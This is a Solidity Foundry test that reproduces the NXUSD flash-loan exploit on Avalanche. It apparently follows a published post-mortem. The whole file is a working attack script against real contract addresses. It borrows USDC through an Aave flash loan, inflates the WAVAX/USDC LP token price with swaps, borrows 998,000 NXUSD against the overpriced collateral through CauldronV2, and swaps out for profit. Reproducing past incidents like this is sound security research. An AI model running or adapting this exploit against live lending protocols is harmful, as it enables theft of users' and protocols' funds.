// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @Analysis
// https://medium.com/nereus-protocol/post-mortem-flash-loan-exploit-in-single-nxusd-market-343fa32f0c6
// Refer: https://github.com/kedao/exploitDefiLabs/blob/main/src/test/Nxusd_exp.sol
// Refer: https://dashboard.tenderly.co/tx/ava/0x0ab12913f9232b27b0664cd2d50e482ad6aa896aeb811b53081712f42d54c026

abstract contract IDegenBox {
    function setMasterContractApproval(
        address user,
        address masterContract,
        bool approved,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) public virtual;

    function masterContractApproved(address masterContract, address user) external view virtual returns (bool);
}

interface ICauldronV2 {
    function updateExchangeRate() external returns (bool, uint256);

    function cook(
        uint8[] calldata actions,
        uint256[] calldata values,
        bytes[] calldata datas
    ) external payable returns (uint256, uint256);
}

contract ContractTest is Test {
    ILendingPool aaveLendingPool = ILendingPool(0x794a61358D6845594F94dc1DB02A252b5b4814aD);
    Uni_Router_V2 Router = Uni_Router_V2(0x60aE616a2155Ee3d9A68541Ba4544862310933d4);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0xf4003F4efBE8691B60249E6afbD307aBE7758adb);
    ICurvePool CRVPool1 = ICurvePool(0x001E3BA199B4FF4B5B6e97aCD96daFC0E2e4156e);
    ICurvePool CRVPool2 = ICurvePool(0x3a43A5851A3e3E0e25A3c1089670269786be1577);
    IERC20 WAVAX = IERC20(0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7);
    IERC20 USDC_e = IERC20(0xA7D7079b0FEaD91F3e65f86E8915Cb59c1a4C664);
    IUSDC USDC = IUSDC(0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E);
    IERC20 NXUSD = IERC20(0xF14f4CE569cB3679E99d5059909E23B07bd2F387);
    IDegenBox DegenBox = IDegenBox(0x0B1F9C2211F77Ec3Fa2719671c5646cf6e59B775);
    ICauldronV2 CauldronV2 = ICauldronV2(0xC0A7a7F141b6A5Bce3EC1B81823c8AFA456B6930);
    address metaPool = 0x6BF6fc7EaF84174bb7e1610Efd865f0eBD2AA96D;
    address masterContract = 0xE767C6C3Bf42f550A5A258A379713322B6c4c060;
    // flashLoan
    address[] public _assets = [0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E]; //usdc
    uint256[] public _amounts = [51_000_000_000_000];
    uint256[] public _modes = [0];
    // borrow
    uint8[] public actions = [5, 21, 20, 10];
    uint256[] public values = [0, 0, 0, 0];
    uint256 borrowAmounts = 998_000 * 1e18;
    uint256 share = 0;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("Avalanche", 19_613_451);
    }

    function testExploit() public {
        USDC.approve(address(Router), type(uint256).max);
        WAVAX.approve(address(Router), type(uint256).max);
        // AAVE flashloan
        aaveLendingPool.flashLoan(address(this), _assets, _amounts, _modes, address(this), new bytes(1), 0);

        emit log_named_uint("After exploit repaid, profit in USDC of attacker:", USDC.balanceOf(address(this)) / 1e6);
    }

    function executeOperation(
        address[] memory assets,
        uint256[] memory amounts,
        uint256[] memory premiums,
        address initiator,
        bytes memory params
    ) public returns (bool) {
        assets;
        amounts;
        premiums;
        params;
        initiator;
        // get LP token
        buyWAVAXAndAddLP();
        // change LP price
        address[] memory path = new address[](2);
        path[0] = address(USDC);
        path[1] = address(WAVAX);
        Router.swapExactTokensForTokens(USDC.balanceOf(address(this)), 0, path, address(this), block.timestamp);

        /*
         * borrow NXUSD
        */
        // set contract apporval
        NXUSD.approve(address(CRVPool1), type(uint256).max);
        Pair.approve(address(DegenBox), type(uint256).max);
        DegenBox.setMasterContractApproval(address(this), masterContract, true, 0, 0, 0);
        // update rate
        CauldronV2.updateExchangeRate();
        // cook function in CauldronV2
        bytes[] memory datas = new bytes[](4);
        datas[0] = abi.encode(borrowAmounts, address(this)); // type borrow
        datas[1] = abi.encode(NXUSD, address(this), borrowAmounts, share); // type withdraw
        datas[2] = abi.encode(Pair, address(this), 45_330_977_931_305_070, share); // type deposit
        datas[3] = abi.encode(-2, address(this), false); // Collateral enter market
        CauldronV2.cook(actions, values, datas);

        // sell WAVAX`
        sellWAVAX();
        // NXUSD -> avCRV -> USDC_e
        CRVPool1.exchange_underlying(metaPool, 0, 2, 998_000 * 1e18, 950_000 * 1e6);
        // USDC_e -> USDC
        USDC_e.approve(address(CRVPool2), type(uint256).max);
        CRVPool2.exchange(0, 1, 800_000 * 1e6, 700_000 * 1e6);
        sellUSDC_e();
        USDC.approve(address(aaveLendingPool), type(uint256).max);
        return true;
    }

    function buyWAVAXAndAddLP() public {
        address[] memory path = new address[](2);
        path[0] = address(USDC);
        path[1] = address(WAVAX);
        Router.swapExactTokensForTokens(280_000 * 1e6, 0, path, address(this), block.timestamp);
        Router.addLiquidity(
            address(USDC),
            address(WAVAX),
            260_000 * 1e6,
            500_000 * 1e18,
            250_000 * 1e6,
            0,
            address(this),
            block.timestamp
        );
    }

    function sellWAVAX() public {
        address[] memory path = new address[](2);
        path[0] = address(WAVAX);
        path[1] = address(USDC);
        Router.swapExactTokensForTokens(WAVAX.balanceOf(address(this)), 0, path, address(this), block.timestamp + 60);
    }

    function sellUSDC_e() public {
        address[] memory path = new address[](2);
        USDC_e.approve(address(Router), type(uint256).max);
        path[0] = address(USDC_e);
        path[1] = address(USDC);
        Router.swapExactTokensForTokens(USDC_e.balanceOf(address(this)), 0, path, address(this), block.timestamp + 60);
    }
}
